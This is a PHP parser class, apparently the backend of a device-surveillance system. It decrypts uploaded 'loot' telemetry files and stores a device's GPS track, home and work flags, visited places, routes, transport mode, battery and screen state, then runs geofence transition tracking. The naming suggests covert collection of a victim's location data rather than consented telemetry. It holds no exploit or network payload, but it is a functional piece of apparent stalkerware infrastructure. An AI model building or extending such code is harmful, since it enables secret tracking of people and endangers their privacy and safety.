<?php

namespace App\Libraries\Parsers;

use App\Models\CryptModel;
use Config\Database;

class LootLocationParser
{
    /**
     * @var \CodeIgniter\Database\BaseConnection
     */
    protected $db;

    /**
     * Constructor to inject or resolve the database.
     *
     * @param \CodeIgniter\Database\BaseConnection|null $db
     */
    public function __construct($db = null)
    {
        $this->db = $db ?? Database::connect();
    }

    /**
     * Parses and inserts location and activity data from modern JSON file.
     *
     * @param string $file_name
     * @param int $var_file_owner
     * @param string $var_file_print
     * @param int|null $fileRecordId
     * @return bool|int Record count or false
     */
    public function parseLocation(string $file_name, int $var_file_owner, string $var_file_print, int $fileRecordId = null)
    {
        try {
            $cryptModel = new CryptModel();
            $dated = date('Y-m-d H:i:s');

            $loot_data = file_get_contents(WRITEPATH . 'uploads/raw_telemetry/' . $file_name);
            if ($loot_data === false) {
                log_message('error', 'Failed to read file: ' . $file_name);
                return false;
            }

            $loot_decoded = $cryptModel->decrypt_file($loot_data);
            if ($loot_decoded === false) {
                log_message('error', 'Failed to decode file: ' . $file_name);
                return false;
            }

            $json = json_decode($loot_decoded, true);
            if ($json === null) {
                log_message('error', 'Invalid JSON in location file: ' . $file_name);
                return false;
            }

            $extracted_at = $json['extracted_at'] ?? null;
            $recordsInserted = 0;

            // 1. Process LocationController Data (singular snapshot)
            if (isset($json['location'])) {
                if ($this->insertLocationRow($json['location'], $var_file_owner, $var_file_print, $extracted_at, $dated)) {
                    $recordsInserted++;
                }
            }

            // 1b. Process LocationController Data (array format from Room-persisted records)
            if (isset($json['locations']) && is_array($json['locations'])) {
                foreach ($json['locations'] as $loc) {
                    if ($this->insertLocationRow($loc, $var_file_owner, $var_file_print, $extracted_at, $dated)) {
                        $recordsInserted++;
                    }
                }
            }

            // 2. Process Activity Data (singular snapshot)
            if (isset($json['activity'])) {
                if ($this->insertActivityRow($json['activity'], $var_file_owner, $var_file_print, $extracted_at, $dated)) {
                    $recordsInserted++;
                }
            }

            // 2b. Process Activity Data (array format from Room-persisted records)
            if (isset($json['activities']) && is_array($json['activities'])) {
                foreach ($json['activities'] as $act) {
                    if ($this->insertActivityRow($act, $var_file_owner, $var_file_print, $extracted_at, $dated)) {
                        $recordsInserted++;
                    }
                }
            }

            // Trigger geo processing after location insert
            if ($recordsInserted > 0) {
                $this->triggerGeoProcessing($var_file_owner, $var_file_print);
            }

            return $recordsInserted;

        } catch (\Exception $e) {
            log_message('error', 'get_location exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * Parses and inserts live locations (batch GPS points).
     *
     * @param string $file_name
     * @param int $ownerId
     * @param string $devicePrint
     * @param int|null $fileRecordId
     * @return bool|int
     */
    public function parseLiveLocations(string $file_name, int $ownerId, string $devicePrint, int $fileRecordId = null)
    {
        try {
            $cryptModel = new CryptModel();
            $dated = date('Y-m-d H:i:s');

            $raw = file_get_contents(WRITEPATH . 'uploads/raw_telemetry/' . $file_name);
            if ($raw === false) {
                log_message('error', 'parse_live_locations: failed to read file: ' . $file_name);
                return false;
            }

            $decoded = $cryptModel->decrypt_file($raw);
            if ($decoded === false) {
                log_message('error', 'parse_live_locations: failed to decode: ' . $file_name);
                return false;
            }

            $json = json_decode($decoded, true);
            if ($json === null) {
                log_message('error', 'parse_live_locations: invalid JSON: ' . $file_name);
                return false;
            }

            $extractedAt = $json['extracted_at'] ?? null;
            $recordsInserted = 0;

            $points = $json['points'] ?? $json['locations'] ?? [];
            if (empty($points) && isset($json['latitude'])) {
                $points = [$json];
            }

            foreach ($points as $pt) {
                $locationData = [
                    'owner_id'      => $ownerId,
                    'device_id'     => $devicePrint,
                    'latitude'      => $pt['latitude'] ?? $pt['lat'] ?? null,
                    'longitude'     => $pt['longitude'] ?? $pt['lon'] ?? $pt['lng'] ?? null,
                    'accuracy'      => $pt['accuracy'] ?? null,
                    'altitude'      => $pt['altitude'] ?? $pt['alt'] ?? null,
                    'bearing'       => $pt['bearing'] ?? null,
                    'speed'         => $pt['speed'] ?? null,
                    'provider'      => $pt['provider'] ?? null,
                    'location_time' => $pt['time'] ?? $pt['timestamp'] ?? $pt['captured_at'] ?? null,
                    'status'        => $pt['status'] ?? (isset($pt['latitude']) ? 'success' : 'no_location_found'),
                    'extracted_at'  => $extractedAt,
                    'created_at'    => $dated,
                    'updated_at'    => $dated,
                ];

                if ($this->db->table('tbl_extracted_locations')->insert($locationData)) {
                    $recordsInserted++;
                }
            }

            // Trigger geo processing after location insert
            if ($recordsInserted > 0) {
                $this->triggerGeoProcessing($ownerId, $devicePrint);
            }

            return $recordsInserted;

        } catch (\Exception $e) {
            log_message('error', 'parse_live_locations exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * Trigger geo intelligence processing after location insert.
     */
    private function triggerGeoProcessing(int $ownerId, string $devicePrint): void
    {
        try {
            $transition = new \App\Services\GeoTransitionDetector();
            $transition->processTransitions($ownerId, $devicePrint, 24);
        } catch (\Exception $e) {
            log_message('error', 'Geo trigger failed: ' . $e->getMessage());
        }
    }

    /**
     * Inserts a single location row.
     */
    private function insertLocationRow(array $loc, int $ownerId, string $devicePrint, ?string $extractedAt, string $dated): bool
    {
        $locationData = [
            'owner_id'      => $ownerId,
            'device_id'     => $devicePrint,
            'latitude'      => $loc['latitude'] ?? null,
            'longitude'     => $loc['longitude'] ?? null,
            'accuracy'      => $loc['accuracy'] ?? null,
            'altitude'      => $loc['altitude'] ?? null,
            'bearing'       => $loc['bearing'] ?? null,
            'speed'         => $loc['speed'] ?? null,
            'provider'      => $loc['provider'] ?? null,
            'location_time' => $loc['location_time'] ?? $loc['time'] ?? null,
            'status'                => $loc['status'] ?? (!empty($loc['latitude']) ? 'success' : 'no_location_found'),
            'geofence_transitions'  => json_encode($loc['geofence_transitions'] ?? []),
            'place_id'              => $loc['place_id'] ?? null,
            'place_name'            => $loc['place_name'] ?? null,
            'place_types'           => json_encode($loc['place_types'] ?? []),
            'place_address'         => $loc['place_address'] ?? null,
            'place_confidence'      => $loc['place_confidence'] ?? 0,
            'place_likelihood'      => $loc['place_likelihood'] ?? 0,
            'is_home'               => isset($loc['is_home']) ? ($loc['is_home'] ? 1 : 0) : 0,
            'is_work'               => isset($loc['is_work']) ? ($loc['is_work'] ? 1 : 0) : 0,
            'is_saved_place'        => isset($loc['is_saved_place']) ? ($loc['is_saved_place'] ? 1 : 0) : 0,
            'visit_duration_ms'     => $loc['visit_duration_ms'] ?? null,
            'arrival_time'          => $loc['arrival_time'] ?? null,
            'departure_time'        => $loc['departure_time'] ?? null,
            'transport_mode'        => $loc['transport_mode'] ?? null,
            'transport_confidence'  => $loc['transport_confidence'] ?? 0,
            'route_polyline'        => $loc['route_polyline'] ?? null,
            'waypoints'             => json_encode($loc['waypoints'] ?? []),
            'speed_kmh'             => $loc['speed_kmh'] ?? null,
            'vertical_accuracy'     => $loc['vertical_accuracy'] ?? null,
            'floor_level'           => $loc['floor_level'] ?? null,
            'building_id'           => $loc['building_id'] ?? null,
            'indoor_level'          => $loc['indoor_level'] ?? null,
            'satellite_count'       => $loc['satellite_count'] ?? 0,
            'hdop'                  => $loc['hdop'] ?? 0,
            'vdop'                  => $loc['vdop'] ?? 0,
            'pdop'                  => $loc['pdop'] ?? 0,
            'gnss_status'           => $loc['gnss_status'] ?? null,
            'nmea_sentence'         => $loc['nmea_sentence'] ?? null,
            'fetched_at'    => $loc['fetched_at'] ?? null,
            'extracted_at'  => $extractedAt ?? $loc['fetched_at'] ?? null,
            'created_at'    => $dated,
            'updated_at'    => $dated
        ];

        try {
            return (bool) $this->db->table('tbl_extracted_locations')->insert($locationData);
        } catch (\Exception $e) {
            log_message('error', 'insertLocationRow failed: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * Inserts a single activity row.
     */
    private function insertActivityRow(array $act, int $ownerId, string $devicePrint, ?string $extractedAt, string $dated): bool
    {
        $activityData = [
            'owner_id'       => $ownerId,
            'device_id'      => $devicePrint,
            'status'         => $act['status'] ?? 'feature_not_fully_implemented',
            'activity_type'  => $act['activity_type'] ?? null,
            'confidence'     => $act['confidence'] ?? 0,
            'info'           => $act['info'] ?? null,
            'is_interactive' => isset($act['is_interactive']) ? ($act['is_interactive'] ? 1 : 0) : 0,
            'battery_level'  => $act['battery_level'] ?? null,
            'charging_status'=> $act['charging_status'] ?? null,
            'network_type'   => $act['network_type'] ?? null,
            'screen_on'      => isset($act['screen_on']) ? ($act['screen_on'] ? 1 : 0) : 0,
            'fetched_at'     => $act['fetched_at'] ?? null,
            'extracted_at'   => $extractedAt ?? $act['fetched_at'] ?? null,
            'activity_time'  => $act['activity_time'] ?? null,
            'created_at'     => $dated,
            'updated_at'     => $dated
        ];

        try {
            return (bool) $this->db->table('tbl_extracted_activities')->insert($activityData);
        } catch (\Exception $e) {
            log_message('error', 'insertActivityRow failed: ' . $e->getMessage());
            return false;
        }
    }
}
